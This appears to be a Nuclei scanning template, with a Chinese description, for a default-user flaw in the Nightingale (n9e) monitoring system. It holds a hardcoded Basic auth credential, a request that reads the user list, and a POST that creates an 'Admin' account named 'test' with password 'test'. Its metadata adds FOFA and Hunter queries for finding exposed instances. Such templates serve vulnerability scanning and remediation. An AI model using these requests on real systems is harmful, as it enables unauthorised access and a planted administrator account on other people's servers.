id: nightingale-default-token
info:
  name: 夜莺开源监控系统存 - default token
  author: leadlife
  severity: high
  description: 夜莺开源监控系统存在默认用户漏洞，/v1/n9e/接口401鉴权存在默认用户
  reference: 
    - https://github.com/wy876/POC/blob/main/%E5%A4%9C%E8%8E%BA%E5%BC%80%E6%BA%90%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/%E5%A4%9C%E8%8E%BA%E5%BC%80%E6%BA%90%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-2047686847"
    hunter-query: web.body="icon-yijigaojing"
  tags: nightingale,default,disclosure

http:
  - raw:
      - |
        GET /v1/n9e/users HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==
              
      - |+
        POST /v1/n9e/users HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==
        Content-Type: application/json
        Content-Length: 61

        {"Username":"test","Password":"test","Roles":["Admin"]}
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'username','nickname','email','phone')
        condition: and